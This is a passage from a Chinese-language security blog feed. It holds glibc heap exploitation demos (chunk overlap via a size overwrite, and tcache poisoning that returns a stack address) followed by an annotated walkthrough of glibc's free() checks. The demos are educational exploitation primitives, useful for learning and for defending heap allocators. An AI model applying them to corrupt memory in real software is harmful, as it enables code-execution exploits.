class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *sentry = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sentry, <span class="string">'b'</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem: %p, sentry: %p\n"</span>,mem, sentry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    *(<span class="keyword">long</span>* )(mem - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;  <span class="comment">// 设置 chunk-&gt;size = 0x110</span></span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">// 分配一个 0x110 的chunk</span></span><br><span class="line">    <span class="built_in">memset</span>(mem2, <span class="string">'a'</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过修改 <code>mem</code> 所在 <code>chunk</code> 的 <code>size</code> 为 <code>0x110</code></p><p>然后释放掉他 ，然后分配一个 <code>0x110</code> 的 <code>chunk</code> ，我们就会再次分配到它。此时 <code>mem2</code> 的 <code>chunk</code> 包含了 <code>sentry</code> 的 <code>chunk</code></p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>通过修改 <code>free</code> 状态的 <code>tcache</code> 里面的 <code>chunk</code> 的 <code>fd</code> （其实就是 <code>tcache_entry-&gt;next</code> ) ，可以分配到任意地址</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> target[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack: %p\n"</span>,target);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    *(<span class="keyword">long</span> *)(mem) = (<span class="keyword">long</span>)target; </span><br><span class="line">    <span class="keyword">char</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一个 <code>0x50</code> 的 <code>chunk</code> 然后释放它，进入 <code>tcache</code> ，然后修改 <code>fd</code> 为 <code>target</code></p><p>然后分配两次 <code>0x50</code> 的 <code>chunk</code> 就可以分配到 <code>target</code></p><p>成功分配到了 栈上面。</p><p>其实 <code>fd</code> 为任意地址都行，原因在于 <code>tcache_get</code> 直接从 <code>tcache-&gt;entries</code> 里面拿 <code>chunk</code> ， 而不检查 拿到的 <code>chunk</code> 是否合法。</p><p>同时 在 <code>malloc</code> 分配内存时，首先使用 <code>tcache</code> ，而它判断 <code>tcache</code> 有没有可以分配的 <code>chunk</code> , 是直接判断指定项有没有指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 根据tcache-&gt;entries[tc_idx]是否为空判断是否有chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p><code>tcache</code> 的引入使得 <code>heap</code> 相关的漏洞的利用非常的简单了。</p><p>简单的原因主要在于 <code>tcache</code> 里面没有做什么检查， 同时还会优先使用这使得原来 <code>malloc</code> 里面的 <code>check</code> 也没有了作用。</p><p><code>free</code> 的话 释放内存如果大小在 <code>tcache</code> 的范围内， 只检测 <strong>size 和 指针</strong> 是否合法，而且检测非常弱。</p><p><code>malloc</code> 时 也是优先使用 <code>tcache</code> ， 只要 <code>tcache-&gt;entries[tc_idx]</code> 非空就可以从 <code>tcache</code> 分配。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p><p><a href="https://www.anquanke.com/post/id/104760" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104760</a></p><p><a href="https://www.cnblogs.com/hac425/p/9416796.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416796.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;glibc 2.26&lt;/code&gt; 开始引入了 &lt;code&gt;tcache&lt;/code&gt; , 相关的 commit 可以看&lt;br&gt;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>free源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/free%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/free源码简单分析/</id>
    <published>2020-02-26T11:14:51.000Z</published>
    <updated>2020-04-07T03:39:47.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GI-libc-free"><a href="#GI-libc-free" class="headerlink" title="_GI___libc_free"></a>_GI___libc_free</h2><p>首先是 _GI___libc_free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall _GI___libc_free(<span class="keyword">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( _free_hook )</span><br><span class="line">  &#123;</span><br><span class="line">    _free_hook(ptr, retaddr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">unsigned</span> __int64)ptr - <span class="number">16</span>;</span><br><span class="line">    v2 = *((_QWORD *)ptr - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp; <span class="number">2</span> )                               <span class="comment">// 判断size位，判断是不是 mmap 获得的 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; v2 &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; v2 &lt;= <span class="number">0x2000000</span></span><br><span class="line">        &amp;&amp; (v1 &lt; (<span class="keyword">unsigned</span> __int64)dumped_main_arena_start || v1 &gt;= (<span class="keyword">unsigned</span> __int64)dumped_main_arena_end) )</span><br><span class="line">      &#123;</span><br><span class="line">        mp_.mmap_threshold = v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * (v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      munmap_chunk((mchunkptr)((<span class="keyword">char</span> *)ptr - <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      av = &amp;main_arena;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &amp; <span class="number">4</span> )</span><br><span class="line">        av = *(malloc_state **)(v1 &amp; <span class="number">0xFFFFFFFFFC000000</span>LL);</span><br><span class="line">      int_free(av, (mchunkptr)v1, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果存在 free_hook ， 就会直接调用 free_hook(ptr) 然后返回。否则判断被 free 的 内存是否是 mmap 获取的 ，如果是则使用 munmap_chunk 回收内存，否则进入 _int_free</p><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>首先会做一些简单的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查指针是否正常，对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 size 是否 &gt;= MINSIZE ，且是否对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 chunk 是否处于 inuse 状态</span></span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>检查</p><ul><li>指针是否对齐</li><li>块的大小是否对齐，且大于最小的大小</li><li>块是否在 inuse 状态</li></ul><h2 id="进入-fastbin"><a href="#进入-fastbin" class="headerlink" title="进入 fastbin"></a>进入 fastbin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">          mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">          locked = <span class="number">1</span>;</span><br><span class="line">          chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ <span class="comment">// next-&gt;size &lt;= 2 * SIZE_SZ</span></span><br><span class="line">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; <span class="comment">// </span></span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">      old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old; <span class="comment">// 插入 fastbin</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果 size 满足 fastbin 的条件，则首先判断 next_chunk-&gt;size 要满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">next_chunk-&gt;size &gt; <span class="number">2</span> * SIZE_SZ</span><br><span class="line">next_chunk-&gt;size &lt; av-&gt;system_mem</span><br></pre></td></tr></table></figure><p>接着就会找对相应的 fastbin ，然后插入 该 bin 的第一项。插入前有一个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>就是 p-&gt;size 索引到的 fastbin 的第一个指针不能和当前的 p 相同，否则会被认为是 double free</p><h2 id="进入-Unsorted-bin"><a href="#进入-Unsorted-bin" class="headerlink" title="进入 Unsorted bin"></a>进入 Unsorted bin</h2><p>如果被 free 的这个块不是 通过 mmap 获得的，就会进入下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 得到下一个 chunk 的指针</span></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能 free top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (top)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">// nextchunk 不能越界，就是限制了 p-&gt;size</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">              &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">              &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"double free or corruption (out)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/*p 要被标识为 inuse 状态 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (!prev)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="comment">// nextsize 在  [ 2 * SIZE_SZ, av-&gt;system_mem] 之间</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果 p的前一个块是 free 状态，就向前合并，通过 p-&gt;pre_inused 判断*/</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">// 获得 nextchunk 的下一个 chunk, 的 pre_inused位</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 nextchunk 也是 free 状态的，合并</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="comment">// 合并的结果放置到 unsorted bin</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 防止 unsortedbin 被破坏</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 free 得到的 unsorted bin 的 size(包括合并chunk 得到的) 大于等于 FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">      systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">       large, because the corresponding heap might go away.  */</span></span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure><p>大概流程</p><ul><li>首先做了一些检查， p != top_chunk, p-&gt;size 不能越界， 限制了 next_chunk-&gt;size, p要处于 inuse状态（通过 next_chunk-&gt;pre_inused 判断）</li><li>接着判断 p 的前后相邻块是不是 free 状态，如果是就合并</li><li>根据此次拿到的 unsorted bin 的 大小，如果 size&gt;=FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</li></ul><p>如果 p 是通过 mmap 获得的，就通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munmap_chunk (p);</span><br></pre></td></tr></table></figure></p><p>释放掉他</p><h2 id="Check-In-Glbc"><a href="#Check-In-Glbc" 